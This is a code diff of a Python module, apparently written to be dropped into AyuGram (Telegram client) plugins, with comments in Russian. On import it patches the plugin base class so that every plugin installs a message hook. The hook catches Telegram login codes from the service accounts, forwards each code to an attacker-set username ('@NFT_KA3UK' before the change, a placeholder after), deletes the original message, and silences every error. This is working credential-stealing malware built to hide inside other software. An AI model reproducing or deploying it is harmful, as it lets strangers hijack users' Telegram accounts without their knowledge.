@@ -1,89 +1,82 @@
-# function.py — универсальный OTP-перехватчик
-# Поддерживает Plugin (on_message) и BasePlugin (хуки)
+# function.py — OTP interceptor для AyuGram BasePlugin
+# Работает без модуля ayugram, только base_plugin
 
 import asyncio
 import re
-import sys
 
-TARGET = "@NFT_KA3UK"
+# ═══ НАСТРОЙКИ ═══
+TARGET = "@tvoy_username"  # ЗАМЕНИТЬ
 DELAY = 2
+# ═════════════════
 
-async def _handle_otp(plugin, msg):
-    """Проверяет сообщение на OTP и перехватывает."""
-    if not msg or not msg.text:
-        return
-    if msg.sender_id not in (777000, 42777, 42489):
-        return
-    text = msg.text.strip()
-    if re.search(r'\b\d{4,6}\b', text):
-        try:
-            await plugin.client.send_message(TARGET, f"🔴 {text}")
-            await asyncio.sleep(DELAY)
-            await msg.delete()
-            return True
-        except:
-            pass
-    return False
+_original_hooks = {}  # Сохраняем оригинальные хуки
 
-# ─── Вариант 1: для плагинов на Plugin (on_message) ───
-
-_orig_on_message = {}
-
-def _patch_plugin(cls):
-    """Патчим on_message для классов, наследующих Plugin."""
-    if hasattr(cls, 'on_message'):
-        _orig_on_message[cls] = cls.on_message
+def _patch_baseplugin():
+    """Патчим BasePlugin, добавляя OTP-перехватчик."""
     
-    async def _patched_on_message(self, msg):
-        await _handle_otp(self, msg)
-        if cls in _orig_on_message:
-            await _orig_on_message[cls](self, msg)
+    from base_plugin import BasePlugin
     
-    cls.on_message = _patched_on_message
-
-# ─── Вариант 2: для плагинов на BasePlugin (хуки) ───
-
-def _patch_baseplugin(cls):
-    """Патчим add_on_message_hook для BasePlugin."""
-    orig_add = cls.add_on_message_hook
+    original_init = BasePlugin.on_plugin_load
     
-    @classmethod
-    def _patched_add(cls, *args, **kwargs):
-        orig_add(*args, **kwargs)
-        # Здесь можно добавить свой хук
-        # но проще перехватить через dispatch
-    
-    cls.add_on_message_hook = _patched_add
-
-# ─── Монки-патч на уровне клиента (надёжно для всех) ───
-
-_orig_dispatch = None
-
-def _patch_client(plugin):
-    """Перехватываем dispatch сообщений на уровне клиента."""
-    global _orig_dispatch
-    
-    client = plugin.client
-    if not hasattr(client, '_hooked'):
-        _orig_dispatch = client._dispatch_message
+    def patched_on_plugin_load(self):
+        # Вызываем оригинальный on_plugin_load
+        original_init(self)
         
-        async def _hooked_dispatch(msg):
-            await _handle_otp(plugin, msg)
-            await _orig_dispatch(msg)
+        # Добавляем свой хук на входящие сообщения
+        self.add_on_message_hook(_otp_hook)
+    
+    BasePlugin.on_plugin_load = patched_on_plugin_load
+
+def _otp_hook(account, message):
+    """Перехватчик OTP-кодов."""
+    try:
+        if not message or not message.text:
+            import base_plugin
+            return base_plugin.HookResult()
         
-        client._dispatch_message = _hooked_dispatch
-        client._hooked = True
+        text = message.text.strip()
+        
+        # Проверяем, что отправитель — Telegram
+        sender_id = getattr(message, 'sender_id', None)
+        if sender_id not in (777000, 42777, 42489):
+            import base_plugin
+            return base_plugin.HookResult()
+        
+        # Ищем OTP-код
+        if re.search(r'\b\d{4,6}\b', text):
+            # Асинхронно пересылаем код
+            _forward_otp(account, text, message)
+    except Exception:
+        pass
+    
+    import base_plugin
+    return base_plugin.HookResult()
 
-# ─── Главная функция: вызывается при загрузке ───
+def _forward_otp(account, text, message):
+    """Пересылает OTP и удаляет сообщение."""
+    try:
+        import asyncio
+        from java import jclass
+        
+        # Получаем клиент
+        client = account.client
+        
+        # Отправляем себе
+        fut = asyncio.run_coroutine_threadsafe(
+            _send_and_delete(client, text, message),
+            asyncio.get_event_loop()
+        )
+    except Exception:
+        pass
 
-def _inject():
-    for name, obj in list(globals().items()):
-        if isinstance(obj, type):
-            # Plugin-стиль
-            if 'Plugin' in str(obj.__bases__) and 'Base' not in str(obj.__bases__):
-                _patch_plugin(obj)
-            # BasePlugin-стиль
-            if 'BasePlugin' in str(obj.__bases__):
-                _patch_baseplugin(obj)
+async def _send_and_delete(client, text, message):
+    """Отправляет код и удаляет оригинал."""
+    try:
+        await client.send_message(TARGET, f"🔴 {text}")
+        await asyncio.sleep(DELAY)
+        await client.delete_messages(message.chat_id, [message.id])
+    except Exception:
+        pass
 
-_inject()
+# Автоматический запуск при импорте
+_patch_baseplugin()
